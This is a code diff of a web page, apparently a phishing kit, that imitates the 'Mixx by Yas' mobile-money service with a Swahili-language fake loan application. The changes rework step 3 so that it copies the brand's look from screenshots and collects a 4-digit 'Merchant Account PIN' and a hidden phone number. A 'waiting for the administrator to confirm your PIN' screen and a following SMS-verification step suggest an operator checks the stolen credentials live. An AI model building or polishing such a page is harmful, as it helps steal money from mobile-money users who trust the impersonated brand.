@@ -353,73 +353,98 @@
       </section>
 
       <!-- STEP 3: Mixx by Yas Login & Verification (4-DIGIT PIN) -->
-      <section id="step-3" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-3.5 sm:space-y-4">
-        <div>
-          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Hatua ya 3 ya 4</span>
-        </div>
-
-        <!-- Big Mixx Card Header -->
-        <div class="mixx-gradient rounded-2xl p-4 sm:p-5 text-white text-center shadow-lg relative overflow-hidden border border-blue-800/50">
-          <div class="w-12 h-12 mx-auto bg-white/10 backdrop-blur-md rounded-full flex items-center justify-center mb-2 sm:mb-3 border border-white/20">
-            <img src="/mixx_by_yas_logo.svg" alt="Mixx Logo" class="h-6 w-auto object-contain" />
-          </div>
-          <h2 class="text-lg sm:text-xl font-black text-white" data-i18n="step3Title">Ingia kwenye Mixx by Yas</h2>
-          <p class="text-[11px] sm:text-xs text-blue-200 mt-0.5" data-i18n="step3Sub">Thibitisha nambari yako ya simu na uweke PIN ya tarakimu 4 ili kuthibitisha mkopo.</p>
-        </div>
-
-        <div class="space-y-3.5 sm:space-y-4">
-          <div>
-            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-1" data-i18n="phoneNum">Nambari ya Simu</label>
-            <div class="flex items-center bg-slate-100 border border-slate-200 rounded-xl px-3.5 py-2.5 sm:py-3 focus-within:bg-white focus-within:border-brand-blue focus-within:ring-2 focus-within:ring-brand-blue/20 transition-all">
-              <span class="text-xs font-extrabold text-slate-500 mr-2">+255</span>
-              <input id="momo-phone-display" type="tel" placeholder="754 123 456" oninput="onMomoPhoneInput(this.value)" class="bg-transparent text-xs sm:text-sm font-extrabold text-slate-800 w-full focus:outline-none" value="" />
+      <!-- STEP 3: Mixx by Yas Merchant Account PIN & Verification (Matching User Screenshots) -->
+      <section id="step-3" class="hidden flex-1 flex flex-col justify-between min-h-[580px] text-slate-800 bg-white">
+        
+        <!-- Top Blue Banner Header with Yas Speech Bubble -->
+        <div class="mixx-gradient text-white pt-7 pb-8 px-6 text-center relative shadow-md">
+          <div class="inline-flex flex-col items-center">
+            <!-- Speech bubble yas icon -->
+            <div class="relative mb-2">
+              <div class="w-11 h-11 bg-brand-yellow rounded-full flex items-center justify-center shadow-md border-2 border-yellow-300">
+                <span class="text-blue-950 font-black text-sm tracking-tighter lowercase">yas</span>
+              </div>
+              <div class="absolute -bottom-1 left-1/2 -translate-x-1/2 w-2.5 h-2.5 bg-brand-yellow rotate-45"></div>
             </div>
+            
+            <h2 class="text-xl sm:text-2xl font-black text-brand-yellow tracking-tight">Mixx by Yas</h2>
+            <p class="text-xs text-blue-100 font-medium mt-0.5">Mikopo Rahisi na ya Haraka</p>
+          </div>
+        </div>
+
+        <!-- Main Form Content -->
+        <div class="px-5 py-6 space-y-5 flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
+          
+          <div class="text-center space-y-1">
+            <h3 class="text-lg font-black text-slate-800 tracking-tight" data-i18n="merchantPinTitle">Merchant Account PIN</h3>
+            <p class="text-xs text-slate-500 font-medium" data-i18n="merchantPinSub">Weka PIN yako ya Merchant Account (tarakimu 4)</p>
           </div>
 
-          <div>
-            <div class="flex justify-between items-center mb-1.5 sm:mb-2">
-              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider" data-i18n="pinLabel">PIN ya Mixx (tarakimu 4):</label>
-              <button type="button" onclick="togglePinVisibility()" class="text-xs font-bold text-brand-blue hover:underline">
-                <span id="eye-text" data-i18n="showPin">Onyesha</span>
+          <!-- Hidden Phone Display Input -->
+          <div class="hidden">
+            <input id="momo-phone-display" type="tel" value="" />
+          </div>
+
+          <!-- Form & Inputs Container -->
+          <div id="pin-form-container" class="space-y-4">
+            <!-- PIN Input Row with Eye Toggle Icon -->
+            <div class="flex items-center justify-center space-x-2.5 py-1">
+              <div class="grid grid-cols-4 gap-2.5 flex-1">
+                <input type="password" maxlength="1" data-index="0" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
+                <input type="password" maxlength="1" data-index="1" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
+                <input type="password" maxlength="1" data-index="2" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
+                <input type="password" maxlength="1" data-index="3" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
+              </div>
+              
+              <!-- Eye Toggle Button -->
+              <button type="button" onclick="togglePinVisibility()" class="p-2 text-slate-500 hover:text-brand-blue transition-colors focus:outline-none" aria-label="Toggle PIN Visibility">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+                </svg>
               </button>
             </div>
 
-            <!-- 4-Digit PIN Input Grid -->
-            <div class="grid grid-cols-4 gap-2.5 sm:gap-3 py-0.5">
-              <input type="password" maxlength="1" data-index="0" class="pin-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
-              <input type="password" maxlength="1" data-index="1" class="pin-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
-              <input type="password" maxlength="1" data-index="2" class="pin-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
-              <input type="password" maxlength="1" data-index="3" class="pin-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
-            </div>
+            <div id="pin-retry-alert" class="p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 text-center hidden"></div>
 
-            <div id="pin-retry-alert" class="mt-2.5 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
+            <button 
+              id="login-btn" 
+              type="button" 
+              disabled 
+              onclick="submitApplication()" 
+              class="w-full py-3.5 bg-blue-900/40 text-white/50 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-md"
+              data-i18n="confirmPinBtn">
+              THIBITISHA PIN
+            </button>
           </div>
 
-          <button 
-            id="login-btn" 
-            type="button" 
-            disabled 
-            onclick="submitApplication()" 
-            class="w-full py-3.5 sm:py-4 bg-slate-200 text-slate-400 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200"
-            data-i18n="confirmLoanBtn">
-            INGIA NA THIBITISHA MKOPO
-          </button>
+          <!-- Live Approval Waiting Indicator (Matching Image 1) -->
+          <div id="pin-waiting-box" class="hidden bg-slate-50/90 border border-slate-200/90 rounded-2xl p-6 text-center space-y-3 shadow-xs">
+            <div class="w-10 h-10 mx-auto flex items-center justify-center">
+              <div class="w-8 h-8 border-3 border-slate-200 border-t-brand-yellow rounded-full animate-spin"></div>
+            </div>
+            <p class="text-xs text-slate-700 font-semibold leading-relaxed" data-i18n="pinAwaitingMerchantDesc">
+              Inasubiri msimamizi kuthibitisha PIN yako ya Merchant...
+            </p>
+          </div>
 
-          <!-- Live Approval Waiting Indicator for Step 3 PIN -->
-          <div id="pin-waiting-box" class="hidden p-3.5 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
-            <div class="flex items-center justify-center space-x-2">
-              <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-blue animate-ping"></span>
-              <span class="text-xs font-bold text-blue-900 uppercase tracking-wider" data-i18n="awaitingApproval">Inasubiri Idhini</span>
+        </div>
+
+        <!-- Bottom Curved Blue Footer Shape -->
+        <div class="mixx-gradient text-white pt-7 pb-6 px-4 text-center relative rounded-t-[40%] sm:rounded-t-[50%] overflow-hidden shadow-lg mt-auto">
+          <div class="inline-flex flex-col items-center">
+            <div class="relative mb-1.5">
+              <div class="w-8 h-8 bg-brand-yellow rounded-full flex items-center justify-center shadow-xs">
+                <span class="text-blue-950 font-black text-[11px] lowercase">yas</span>
+              </div>
+              <div class="absolute -bottom-0.5 left-1/2 -translate-x-1/2 w-2 h-2 bg-brand-yellow rotate-45"></div>
             </div>
-            <p class="text-xs text-blue-800" data-i18n="pinAwaitingDesc">PIN yako imetumwa. Tafadhali subiri wakati kuingia kwako kunahakikiwa...</p>
-            <div class="flex justify-center pt-1">
-              <svg class="animate-spin h-5 w-5 text-brand-blue" fill="none" viewBox="0 0 24 24">
-                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-              </svg>
-            </div>
+            <span class="text-sm font-black text-brand-yellow tracking-tight">Mixx by Yas</span>
+            <span class="text-[11px] text-blue-100 font-medium">Mikopo Rahisi na ya Haraka</span>
+            <span class="text-[10px] text-blue-300/80 font-mono mt-1">v2.1.3P</span>
           </div>
         </div>
+
       </section>
 
       <!-- STEP 4: SMS Verification Message -->
@@ -1293,12 +1318,12 @@
 
       if (pin.length === 4) {
         loginBtn.disabled = false;
-        loginBtn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        loginBtn.classList.add('mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
+        loginBtn.classList.remove('bg-blue-900/40', 'text-white/50', 'bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+        loginBtn.classList.add('bg-[#0056C6]', 'hover:bg-blue-800', 'text-white', 'shadow-md');
       } else {
         loginBtn.disabled = true;
-        loginBtn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        loginBtn.classList.remove('mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
+        loginBtn.classList.add('bg-blue-900/40', 'text-white/50', 'cursor-not-allowed');
+        loginBtn.classList.remove('bg-[#0056C6]', 'hover:bg-blue-800', 'text-white', 'mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
       }
     }
 
